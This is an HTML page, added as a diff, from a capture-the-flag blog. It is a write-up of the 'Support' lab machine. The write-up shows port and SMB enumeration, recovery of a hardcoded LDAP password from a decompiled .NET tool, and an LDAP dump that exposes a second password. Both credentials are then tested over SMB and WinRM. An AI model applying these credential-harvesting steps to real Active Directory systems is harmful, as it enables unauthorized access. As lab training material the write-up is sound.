@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>CentHack | Welcome to my blog!!</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="CentHack" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Welcome to my blog!!" />
+<meta property="og:description" content="Welcome to my blog!!" />
+<link rel="canonical" href="http://localhost:4000/pages/writeups/support.html" />
+<meta property="og:url" content="http://localhost:4000/pages/writeups/support.html" />
+<meta property="og:site_name" content="CentHack" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="CentHack" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Welcome to my blog!!","headline":"CentHack","url":"http://localhost:4000/pages/writeups/support.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>CentHack</h1>
+        </a>
+        <h2>Welcome to my blog!!</h2>
+
+        <section id="downloads">
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="support">Support</h1>
+
+<h1 id="enumeration">Enumeration</h1>
+
+<p>IP → 10.10.11.174</p>
+
+<p>Port scan reported the following opened ports.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PORT</span>      <span class="n">STATE</span> <span class="n">SERVICE</span>          <span class="n">REASON</span>
+<span class="mi">53</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">domain</span>           <span class="n">syn</span><span class="o">-</span><span class="n">ack</span>
+<span class="mi">88</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">kerberos</span><span class="o">-</span><span class="n">sec</span>     <span class="n">syn</span><span class="o">-</span><span class="n">ack</span>
+<span class="mi">135</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">msrpc</span>            <span class="n">syn</span><span class="o">-</span><span class="n">ack</span>
+<span class="mi">139</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>      <span class="n">syn</span><span class="o">-</span><span class="n">ack</span>
+<span class="mi">389</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ldap</span>             <span class="n">syn</span><span class="o">-</span><span class="n">ack</span>
+<span class="mi">445</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span>     <span class="n">syn</span><span class="o">-</span><span class="n">ack</span>
+<span class="mi">464</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">kpasswd5</span>         <span class="n">syn</span><span class="o">-</span><span class="n">ack</span>
+<span class="mi">593</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">http</span><span class="o">-</span><span class="n">rpc</span><span class="o">-</span><span class="n">epmap</span>   <span class="n">syn</span><span class="o">-</span><span class="n">ack</span>
+<span class="mi">636</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ldapssl</span>          <span class="n">syn</span><span class="o">-</span><span class="n">ack</span>
+<span class="mi">3268</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">globalcatLDAP</span>    <span class="n">syn</span><span class="o">-</span><span class="n">ack</span>
+<span class="mi">3269</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">globalcatLDAPssl</span> <span class="n">syn</span><span class="o">-</span><span class="n">ack</span>
+<span class="mi">5985</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">wsman</span>            <span class="n">syn</span><span class="o">-</span><span class="n">ack</span>
+<span class="mi">9389</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">adws</span>             <span class="n">syn</span><span class="o">-</span><span class="n">ack</span>
+<span class="mi">49664</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>          <span class="n">syn</span><span class="o">-</span><span class="n">ack</span>
+<span class="mi">49668</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>          <span class="n">syn</span><span class="o">-</span><span class="n">ack</span>
+<span class="mi">49674</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>          <span class="n">syn</span><span class="o">-</span><span class="n">ack</span>
+<span class="mi">49679</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>          <span class="n">syn</span><span class="o">-</span><span class="n">ack</span>
+<span class="mi">49703</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>          <span class="n">syn</span><span class="o">-</span><span class="n">ack</span>
+<span class="mi">63100</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>          <span class="n">syn</span><span class="o">-</span><span class="n">ack</span>
+</code></pre></div></div>
+
+<p>To obtain the name of the machine and the domain we can un crackmapexec.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">machines</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">support</span><span class="p">]</span>
+<span class="err">└─$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.174</span>
+<span class="n">SMB</span>         <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.174</span>    <span class="mi">445</span>    <span class="n">DC</span>               <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">20348</span> <span class="nf">x64 </span><span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">support</span><span class="p">.</span><span class="n">htb</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="bp">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="bp">False</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="port-53">Port 53</h2>
+
+<ul>
+  <li>transfer zone not available</li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">machines</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">support</span><span class="p">]</span>
+<span class="err">└─$</span> <span class="n">dig</span> <span class="n">ANY</span> <span class="n">support</span><span class="p">.</span><span class="n">htb</span> <span class="o">@</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">11.174</span>           
+
+<span class="p">;</span> <span class="o">&lt;&lt;&gt;&gt;</span> <span class="n">DiG</span> <span class="mf">9.18</span><span class="p">.</span><span class="mi">16</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="n">Debian</span> <span class="o">&lt;&lt;&gt;&gt;</span> <span class="n">ANY</span> <span class="n">support</span><span class="p">.</span><span class="n">htb</span> <span class="o">@</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">11.174</span>
+<span class="p">;;</span> <span class="k">global</span> <span class="n">options</span><span class="p">:</span> <span class="o">+</span><span class="n">cmd</span>
+<span class="p">;;</span> <span class="n">Got</span> <span class="n">answer</span><span class="p">:</span>
+<span class="p">;;</span> <span class="o">-&gt;&gt;</span><span class="n">HEADER</span><span class="o">&lt;&lt;-</span> <span class="n">opcode</span><span class="p">:</span> <span class="n">QUERY</span><span class="p">,</span> <span class="n">status</span><span class="p">:</span> <span class="n">NOERROR</span><span class="p">,</span> <span class="nb">id</span><span class="p">:</span> <span class="mi">40503</span>
+<span class="p">;;</span> <span class="n">flags</span><span class="p">:</span> <span class="n">qr</span> <span class="n">aa</span> <span class="n">rd</span> <span class="n">ra</span><span class="p">;</span> <span class="n">QUERY</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="n">ANSWER</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span> <span class="n">AUTHORITY</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ADDITIONAL</span><span class="p">:</span> <span class="mi">2</span>
+
+<span class="p">;;</span> <span class="n">OPT</span> <span class="n">PSEUDOSECTION</span><span class="p">:</span>
+<span class="p">;</span> <span class="n">EDNS</span><span class="p">:</span> <span class="n">version</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="n">flags</span><span class="p">:;</span> <span class="n">udp</span><span class="p">:</span> <span class="mi">4000</span>
+<span class="p">;;</span> <span class="n">QUESTION</span> <span class="n">SECTION</span><span class="p">:</span>
+<span class="p">;</span><span class="n">support</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span>                   <span class="n">IN</span>      <span class="n">ANY</span>
+
+<span class="p">;;</span> <span class="n">ANSWER</span> <span class="n">SECTION</span><span class="p">:</span>
+<span class="n">support</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span>            <span class="mi">600</span>     <span class="n">IN</span>      <span class="n">A</span>       <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.174</span>
+<span class="n">support</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span>            <span class="mi">3600</span>    <span class="n">IN</span>      <span class="n">NS</span>      <span class="n">dc</span><span class="p">.</span><span class="n">support</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span>
+<span class="n">support</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span>            <span class="mi">3600</span>    <span class="n">IN</span>      <span class="n">SOA</span>     <span class="n">dc</span><span class="p">.</span><span class="n">support</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span> <span class="n">hostmaster</span><span class="p">.</span><span class="n">support</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span> <span class="mi">105</span> <span class="mi">900</span> <span class="mi">600</span> <span class="mi">86400</span> <span class="mi">3600</span>
+
+<span class="p">;;</span> <span class="n">ADDITIONAL</span> <span class="n">SECTION</span><span class="p">:</span>
+<span class="n">dc</span><span class="p">.</span><span class="n">support</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span>         <span class="mi">3600</span>    <span class="n">IN</span>      <span class="n">A</span>       <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.174</span>
+
+<span class="p">;;</span> <span class="n">Query</span> <span class="n">time</span><span class="p">:</span> <span class="mi">48</span> <span class="n">msec</span>
+<span class="p">;;</span> <span class="n">SERVER</span><span class="p">:</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.174</span><span class="c1">#53(10.10.11.174) (TCP)
+</span><span class="p">;;</span> <span class="n">WHEN</span><span class="p">:</span> <span class="n">Wed</span> <span class="n">Nov</span> <span class="mi">29</span> <span class="mi">06</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">59</span> <span class="n">CET</span> <span class="mi">2023</span>
+<span class="p">;;</span> <span class="n">MSG</span> <span class="n">SIZE</span>  <span class="n">rcvd</span><span class="p">:</span> <span class="mi">136</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">machines</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">support</span><span class="p">]</span>
+<span class="err">└─$</span> <span class="n">dig</span> <span class="n">axfr</span> <span class="n">support</span><span class="p">.</span><span class="n">htb</span> <span class="o">@</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">11.174</span>
+
+<span class="p">;</span> <span class="o">&lt;&lt;&gt;&gt;</span> <span class="n">DiG</span> <span class="mf">9.18</span><span class="p">.</span><span class="mi">16</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="n">Debian</span> <span class="o">&lt;&lt;&gt;&gt;</span> <span class="n">axfr</span> <span class="n">support</span><span class="p">.</span><span class="n">htb</span> <span class="o">@</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">11.174</span>
+<span class="p">;;</span> <span class="k">global</span> <span class="n">options</span><span class="p">:</span> <span class="o">+</span><span class="n">cmd</span>
+<span class="p">;</span> <span class="n">Transfer</span> <span class="n">failed</span><span class="p">.</span>
+</code></pre></div></div>
+
+<h2 id="port-135">Port 135</h2>
+
+<ul>
+  <li>Need credentials</li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">machines</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">support</span><span class="p">]</span>
+<span class="err">└─$</span> <span class="n">rpcclient</span> <span class="o">-</span><span class="n">U</span> <span class="sh">'</span><span class="s">%</span><span class="sh">'</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.174</span>
+<span class="n">rpcclient</span> <span class="err">$</span><span class="o">&gt;</span> <span class="n">enumdomusers</span>
+<span class="n">result</span> <span class="n">was</span> <span class="n">NT_STATUS_ACCESS_DENIED</span>
+</code></pre></div></div>
+
+<h2 id="port-139445">Port 139/445</h2>
+
+<ul>
+  <li>SMB</li>
+  <li>We have access</li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">machines</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">support</span><span class="p">]</span>
+<span class="err">└─$</span> <span class="n">smbclient</span> <span class="o">-</span><span class="n">L</span> \\\\<span class="mf">10.10</span><span class="p">.</span><span class="mf">11.174</span>\\ <span class="o">-</span><span class="n">N</span>
+
+        <span class="n">Sharename</span>       <span class="n">Type</span>      <span class="n">Comment</span>
+        <span class="o">---------</span>       <span class="o">----</span>      <span class="o">-------</span>
+        <span class="n">ADMIN</span><span class="err">$</span>          <span class="n">Disk</span>      <span class="n">Remote</span> <span class="n">Admin</span>
+        <span class="n">C</span><span class="err">$</span>              <span class="n">Disk</span>      <span class="n">Default</span> <span class="n">share</span>
+        <span class="n">IPC</span><span class="err">$</span>            <span class="n">IPC</span>       <span class="n">Remote</span> <span class="n">IPC</span>
+        <span class="n">NETLOGON</span>        <span class="n">Disk</span>      <span class="n">Logon</span> <span class="n">server</span> <span class="n">share</span> 
+        <span class="n">support</span><span class="o">-</span><span class="n">tools</span>   <span class="n">Disk</span>      <span class="n">support</span> <span class="n">staff</span> <span class="n">tools</span>
+        <span class="n">SYSVOL</span>          <span class="n">Disk</span>      <span class="n">Logon</span> <span class="n">server</span> <span class="n">share</span> 
+<span class="n">Reconnecting</span> <span class="k">with</span> <span class="n">SMB1</span> <span class="k">for</span> <span class="n">workgroup</span> <span class="n">listing</span><span class="p">.</span>
+<span class="n">do_connect</span><span class="p">:</span> <span class="n">Connection</span> <span class="n">to</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.174</span> <span class="nf">failed </span><span class="p">(</span><span class="n">Error</span> <span class="n">NT_STATUS_RESOURCE_NAME_NOT_FOUND</span><span class="p">)</span>
+<span class="n">Unable</span> <span class="n">to</span> <span class="n">connect</span> <span class="k">with</span> <span class="n">SMB1</span> <span class="o">--</span> <span class="n">no</span> <span class="n">workgroup</span> <span class="n">available</span>
+</code></pre></div></div>
+
+<p>In the share <strong>support-tools</strong> we find a lot of executables, but there is one that is odd.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">machines</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">support</span><span class="p">]</span>
+<span class="err">└─$</span> <span class="n">smbclient</span> \\\\<span class="mf">10.10</span><span class="p">.</span><span class="mf">11.174</span>\\<span class="n">support</span><span class="o">-</span><span class="n">tools</span>
+<span class="n">Password</span> <span class="k">for</span> <span class="p">[</span><span class="n">WORKGROUP</span>\<span class="n">kali</span><span class="p">]:</span>
+<span class="n">Try</span> <span class="sh">"</span><span class="s">help</span><span class="sh">"</span> <span class="n">to</span> <span class="n">get</span> <span class="n">a</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">possible</span> <span class="n">commands</span><span class="p">.</span>
+<span class="n">smb</span><span class="p">:</span> \<span class="o">&gt;</span> <span class="n">ls</span>
+  <span class="p">.</span>                                   <span class="n">D</span>        <span class="mi">0</span>  <span class="n">Wed</span> <span class="n">Jul</span> <span class="mi">20</span> <span class="mi">19</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mi">06</span> <span class="mi">2022</span>
+  <span class="p">..</span>                                  <span class="n">D</span>        <span class="mi">0</span>  <span class="n">Sat</span> <span class="n">May</span> <span class="mi">28</span> <span class="mi">13</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">25</span> <span class="mi">2022</span>
+  <span class="mi">7</span><span class="o">-</span><span class="n">ZipPortable_21</span><span class="p">.</span><span class="mf">07.</span><span class="n">paf</span><span class="p">.</span><span class="n">exe</span>         <span class="n">A</span>  <span class="mi">2880728</span>  <span class="n">Sat</span> <span class="n">May</span> <span class="mi">28</span> <span class="mi">13</span><span class="p">:</span><span class="mi">19</span><span class="p">:</span><span class="mi">19</span> <span class="mi">2022</span>
+  <span class="n">npp</span><span class="p">.</span><span class="mf">8.4</span><span class="p">.</span><span class="mf">1.</span><span class="n">portable</span><span class="p">.</span><span class="n">x64</span><span class="p">.</span><span class="nb">zip</span>          <span class="n">A</span>  <span class="mi">5439245</span>  <span class="n">Sat</span> <span class="n">May</span> <span class="mi">28</span> <span class="mi">13</span><span class="p">:</span><span class="mi">19</span><span class="p">:</span><span class="mi">55</span> <span class="mi">2022</span>
+  <span class="n">putty</span><span class="p">.</span><span class="n">exe</span>                           <span class="n">A</span>  <span class="mi">1273576</span>  <span class="n">Sat</span> <span class="n">May</span> <span class="mi">28</span> <span class="mi">13</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">06</span> <span class="mi">2022</span>
+  <span class="n">SysinternalsSuite</span><span class="p">.</span><span class="nb">zip</span>               <span class="n">A</span> <span class="mi">48102161</span>  <span class="n">Sat</span> <span class="n">May</span> <span class="mi">28</span> <span class="mi">13</span><span class="p">:</span><span class="mi">19</span><span class="p">:</span><span class="mi">31</span> <span class="mi">2022</span>
+  <span class="n">UserInfo</span><span class="p">.</span><span class="n">exe</span><span class="p">.</span><span class="nb">zip</span>                    <span class="n">A</span>   <span class="mi">277499</span>  <span class="n">Wed</span> <span class="n">Jul</span> <span class="mi">20</span> <span class="mi">19</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mi">07</span> <span class="mi">2022</span>
+  <span class="n">windirstat1_1_2_setup</span><span class="p">.</span><span class="n">exe</span>           <span class="n">A</span>    <span class="mi">79171</span>  <span class="n">Sat</span> <span class="n">May</span> <span class="mi">28</span> <span class="mi">13</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">17</span> <span class="mi">2022</span>
+  <span class="n">WiresharkPortable64_3</span><span class="p">.</span><span class="mf">6.5</span><span class="p">.</span><span class="n">paf</span><span class="p">.</span><span class="n">exe</span>      <span class="n">A</span> <span class="mi">44398000</span>  <span class="n">Sat</span> <span class="n">May</span> <span class="mi">28</span> <span class="mi">13</span><span class="p">:</span><span class="mi">19</span><span class="p">:</span><span class="mi">43</span> <span class="mi">2022</span>
+</code></pre></div></div>
+
+<p>We can try to decompile the .exe and see if can check the source code.</p>
+
+<h1 id="foothold">Foothold</h1>
+
+<h2 id="decompiling-the-net-application">Decompiling the .NET application</h2>
+
+<p>For this we can use <strong>DNSpy</strong>. Once it is decompilated we can see all their functions, and it seems that this binary seeks a user using ldap queries.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">public</span> <span class="nc">LdapQuery</span><span class="p">()</span>
+		<span class="p">{</span>
+			<span class="n">string</span> <span class="n">password</span> <span class="o">=</span> <span class="n">Protected</span><span class="p">.</span><span class="nf">getPassword</span><span class="p">();</span>
+			<span class="n">this</span><span class="p">.</span><span class="n">entry</span> <span class="o">=</span> <span class="n">new</span> <span class="nc">DirectoryEntry</span><span class="p">(</span><span class="sh">"</span><span class="s">LDAP://support.htb</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">support</span><span class="se">\\</span><span class="s">ldap</span><span class="sh">"</span><span class="p">,</span> <span class="n">password</span><span class="p">);</span>
+			<span class="n">this</span><span class="p">.</span><span class="n">entry</span><span class="p">.</span><span class="n">AuthenticationType</span> <span class="o">=</span> <span class="n">AuthenticationTypes</span><span class="p">.</span><span class="n">Secure</span><span class="p">;</span>
+			<span class="n">this</span><span class="p">.</span><span class="n">ds</span> <span class="o">=</span> <span class="n">new</span> <span class="nc">DirectorySearcher</span><span class="p">(</span><span class="n">this</span><span class="p">.</span><span class="n">entry</span><span class="p">);</span>
+		<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The user is <strong>support\ldap</strong> but the password we don’t know yet. If we search more in the binary we will find the encrypted password.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">static</span> <span class="nc">Protected</span><span class="p">()</span>
+<span class="p">{</span>
+	<span class="n">Protected</span><span class="p">.</span><span class="n">enc_password</span> <span class="o">=</span> <span class="sh">"</span><span class="s">0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E</span><span class="sh">"</span><span class="p">;</span>
+	<span class="n">Protected</span><span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="nc">GetBytes</span><span class="p">(</span><span class="sh">"</span><span class="s">armando</span><span class="sh">"</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>To know the plain text password there are some thing we can do:</p>
+
+<ul>
+  <li>Debug the binary and set a breakpoint to read the password as a variable</li>
+  <li>Lunch the query and inspect it with wireshark</li>
+  <li>Since we have the chiper text, the key and the algorithm to decrypt it, we should be able to use Python to replicate the algorithm.</li>
+</ul>
+
+<p>The fastest way is to use the debugger that comes with DNSpy and set a breakpoint. With this we obtain the credentials <code class="language-plaintext highlighter-rouge">ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</code> , which are valid.</p>
+
+<h2 id="seeking-further-into-ldap">Seeking further into LDAP</h2>
+
+<p>This user must have privileges to access ldap so lets try to find useful information there. If we dump the entire ldap tree we can use grep to search for uncommon things.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ldapsearch</span> <span class="o">-</span><span class="n">H</span> <span class="n">ldap</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">11.174</span> <span class="o">-</span><span class="n">b</span> <span class="sh">"</span><span class="s">DC=support,DC=htb</span><span class="sh">"</span> <span class="o">-</span><span class="n">U</span> <span class="n">ldap</span> <span class="o">-</span><span class="n">w</span> <span class="sh">'</span><span class="s">nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</span><span class="sh">'</span> <span class="o">&gt;</span> <span class="n">ldap_dumped</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">machines</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">support</span><span class="p">]</span>
+<span class="err">└─$</span> <span class="n">cat</span> <span class="n">ldap_dumped</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">i</span> <span class="o">-</span><span class="n">A28</span> <span class="sh">'</span><span class="s">CN=Users,DC=support,DC=htb</span><span class="sh">'</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">vEw</span> <span class="sh">'</span><span class="s">dn|objectClass|objectClass|objectClass|objectClass|cn|sn|c|l|st|postalCode|givenName|distinguishedName|instanceType|whenCreated|whenChanged|uSNCreated|uSNChanged|company|streetAddress|name|objectGUID|userAccountControl|badPwdCount|codePage|countryCode|badPasswordTime|lastLogoff|lastLogon|pwdLastSet|primaryGroupID|objectSid|accountExpires|logonCount|sAMAccountName|sAMAccountType|objectCategory|dSCorePropagationData|dSCorePropagationData|mail</span><span class="sh">'</span>
+</code></pre></div></div>
+
+<p>This query will filter all the users and show strange lines, doing this we find a field that is not common.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">info</span><span class="p">:</span> <span class="n">Ironside47pleasure40Watchful</span>
+</code></pre></div></div>
+
+<p>We find something that may be a password for the user <code class="language-plaintext highlighter-rouge">support</code> .</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">machines</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">support</span><span class="p">]</span>
+<span class="err">└─$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.174</span> <span class="o">-</span><span class="n">u</span> <span class="sh">'</span><span class="s">support</span><span class="sh">'</span> <span class="o">-</span><span class="n">p</span> <span class="sh">'</span><span class="s">Ironside47pleasure40Watchful</span><span class="sh">'</span>        
+<span class="n">SMB</span>         <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.174</span>    <span class="mi">445</span>    <span class="n">DC</span>               <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">20348</span> <span class="nf">x64 </span><span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">support</span><span class="p">.</span><span class="n">htb</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="bp">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="bp">False</span><span class="p">)</span>
+<span class="n">SMB</span>         <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.174</span>    <span class="mi">445</span>    <span class="n">DC</span>               <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">support</span><span class="p">.</span><span class="n">htb</span>\<span class="n">support</span><span class="p">:</span><span class="n">Ironside47pleasure40Watchful</span> 
+                                                                                                                                                                                                                                            
+<span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">machines</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">support</span><span class="p">]</span>
+<span class="err">└─$</span> <span class="n">crackmapexec</span> <span class="n">winrm</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.174</span> <span class="o">-</span><span class="n">u</span> <span class="sh">'</span><span class="s">support</span><span class="sh">'</span> <span class="o">-</span><span class="n">p</span> <span class="sh">'</span><span class="s">Ironside47pleasure40Watchful</span><span class="sh">'</span>
+<span class="n">SMB</span>         <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.174</span>    <span class="mi">5985</span>   <span class="n">DC</span>               <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">20348</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">support</span><span class="p">.</span><span class="n">htb</span><span class="p">)</span>
